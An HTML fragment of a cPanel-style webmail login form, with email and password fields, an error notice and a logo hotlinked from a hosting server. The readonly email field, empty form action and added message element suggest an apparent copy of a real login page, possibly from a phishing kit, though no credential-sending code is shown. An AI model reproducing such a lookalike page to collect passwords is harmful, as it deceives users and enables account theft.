<div id="login-wrapper" class="group has-pw-reset" style="opacity: 1; visibility: visible;">
    <div class="wrapper">
    <div id="notify">
        
        
         <div id="login-status" class="error-notice" style="display:none;">
            <div class="content-wrapper">
                <div id="login-detail">
                    <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
                    <div id="login-status-message">The login is invalid.</div>
                </div>
            </div>
        </div>       
       
    </div>


    <div id="content-container">
        <div id="login-container">

            <div id="login-sub-container">
                    <div id="login-sub-header">
                        
                        <img class="main-logo" src="https://sh001.webhostbox.net:2096/cPanel_magic_revision_1560308612/unprotected/cpanel/images/webmail-logo.svg" alt="logo">
                        
                    </div>
                    <div id="login-sub">
                        
                        <div id="forms">
                            <form novalidate="" id="login_form" action="" method="POST"  style="visibility:">
                                <div class="input-req-login"><label for="user">Email Address</label></div>
                                <div class="input-field-login icon username-container">
                                    <input name="email" id="email" autofocus="autofocus"  placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" readonly="">
                                </div>
                                <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
                                <div class="input-field-login icon password-container">
                                    <input name="password" id="password" placeholder="Enter your email password." class="std_textbox" type="password" tabindex="2" required="">
                                </div>
								<p id="msg" style="color:red;"></p>
                                <div class="controls">
                                    <div class="login-btn">
                                        <button name="login"  id="login_submit" tabindex="3">Log in</button>
                                    </div>

                                                                            <div class="reset-pw">
                                            <a href="#" id="reset_password">Reset Password
                                            </a>
                                        </div>
                                                                    </div>
                                <div class="clear" id="push"></div>
                            </form>
                        <!--CLOSE forms -->
                        </div>

                    </div>
